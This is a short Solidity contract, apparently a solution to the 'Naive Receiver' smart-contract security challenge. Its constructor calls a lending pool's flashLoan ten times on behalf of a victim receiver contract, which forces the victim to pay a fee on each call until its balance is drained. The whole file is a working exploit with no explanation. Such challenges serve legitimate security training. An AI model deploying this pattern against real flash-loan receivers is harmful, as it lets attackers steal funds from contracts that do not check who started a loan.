pragma solidity ^0.6.0;
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    constructor(address payable pool, address payable naiveReceiverAddress)
        public
    {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(naiveReceiverAddress, 0);
        }
    }
}
